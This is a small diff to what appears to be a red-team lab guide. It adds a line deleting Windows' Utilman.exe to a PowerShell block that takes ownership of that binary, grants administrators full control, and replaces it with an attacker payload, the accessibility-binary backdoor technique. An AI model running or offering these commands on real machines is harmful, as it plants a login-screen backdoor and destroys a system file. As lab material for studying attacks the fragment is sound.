@@ -11,6 +11,7 @@
     ```powershell
     takeown /f c:\windows\system32\Utilman.exe /A;
 	icacls c:\windows\system32\Utilman.exe /grant administrators:F;
+	rm c:\windows\system32\utilman.exe;
 	<move/copy> <payload path> c:\windows\system32\Utilman.exe;
     ```
 4. Save the file with as` NoobNoob.ps1` to `/tmp` on parrot-vm
